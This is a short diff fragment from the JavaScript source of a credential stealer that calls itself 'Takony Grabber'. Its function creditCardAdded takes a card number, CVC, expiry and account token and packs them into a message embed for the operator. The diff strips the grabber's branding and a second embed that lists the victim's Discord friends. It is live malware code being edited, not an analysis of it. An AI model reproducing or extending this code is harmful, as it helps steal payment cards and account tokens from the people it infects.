@@ -723,29 +723,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
                 value: `\`\`\`${token}\`\`\``,
                 inline: !1
             },
-            ],
-            "author": {
-                "name": "Takony Grabber"
-            },
-            "footer": {
-                "text": "Takony Grabber"
-            },
-            "thumbnail": {
-                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-            }
-        }, {
-            "title": `Total Friends (${friends.length})`,
-            "color": config['embed-color'],
-            "description": friends.frien,
-            "author": {
-                "name": "Takony Grabber"
-            },
-            "footer": {
-                "text": "Takony Grabber"
-            },
-            "thumbnail": {
-                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-            }
+            ]
         }]
     };
 
